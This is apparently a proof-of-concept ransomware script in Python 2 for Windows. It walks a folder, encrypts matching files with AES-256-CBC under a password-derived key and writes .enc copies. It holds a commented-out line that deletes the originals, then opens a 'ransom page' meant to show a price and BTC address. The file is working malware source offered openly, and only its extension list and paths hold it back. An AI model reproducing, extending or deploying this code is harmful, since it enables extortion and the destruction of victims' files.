#!/usr/bin/python
import os, random, struct, hashlib, time, win32api, webbrowser
from Crypto.Cipher import AES

extensions = ['.txt'] # Test only with txt files, add more extensions at your own risk
homedir = "C:\Users\Python\Desktop\Ransom\File"
path = os.path.join(homedir, "firstdir")
url = "https://github.com/luisxciv/SYrans" #Ransom page to display with price, BTC address etc...
new = 2 # opens in new tab (if possible)
LARGE_FONT= ("Verdana", 10)

def encryption(key):
    for drive in win32api.GetLogicalDriveStrings().split('\000')[:-1]:
        for root, dirs, files in os.walk(homedir):
            for file in files:
                if file.endswith(tuple(extensions)):
                    in_filename = (os.path.join(root, file))

                    print "[+] - Files found = [+]"
                    print in_filename
    
                    #Prints the files in the dir
                    print "[!] - Encrypting files..."
                    # Encrypts the file and adds .enc extension
                    encrypt(key,in_filename)
                    print "[+] - Files are now encrypted."
                    #

                    print "[!] - Deleting Original Files..."
                # Uncomment the line below to remove the original files (If you don't know how to decrypt with python using AES 256-CBC then dont uncomment.
                   # os.remove(os.path.join(root, file))
                    print "[+] - Original files deleted."
    
                    #Proceeds to next dir
                    seconds = int(1)
                    print "[+] - Next encryption in %s second" %seconds
                    time.sleep(seconds)
                    print

    print "[+] - All files are now encrypted and replaced with a .enc file extension"


#Encryption algorythm (AES-CBC 256)
def encrypt(key, in_filename, out_filename=None, chunksize=64*1024):
    if not out_filename:
        out_filename = in_filename + '.enc'
    iv = ''.join(chr(random.randint(0, 0xFF)) for i in range(16))
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    filesize = os.path.getsize(in_filename)

    with open(in_filename, 'rb') as infile:
        with open(out_filename, 'wb') as outfile:
            outfile.write(struct.pack('<Q', filesize))
            outfile.write(iv)
            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += ' ' * (16 - len(chunk) % 16)

                outfile.write(encryptor.encrypt(chunk))

def password():
    password = raw_input('Enter encryption password: ')
    key = hashlib.sha256(password).digest()
    encryption(key)
def main():
    password()
    webbrowser.open(url, new=new)

main()